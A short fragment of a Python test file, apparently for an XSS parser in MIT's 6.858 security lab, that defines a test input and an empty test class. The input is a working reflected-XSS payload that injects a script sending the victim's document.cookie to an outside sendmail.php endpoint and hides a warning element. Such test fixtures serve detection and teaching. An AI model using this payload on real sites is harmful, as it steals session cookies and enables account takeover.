...
TEST_XSS_INPUT = ["""?user=" size=10><script>javascript:void((new Image()).src='http://pdos.csail.mit.edu/6.858/2012/labs/sendmail.php?to=joshblum@mit.edu&payload=' + encodeURIComponent(document.cookie) +'&random=' + Math.random());</script><style>.warning{display:none}</style><input type="hidden"""]

class XSSParserTestBase(unittest.TestCase):
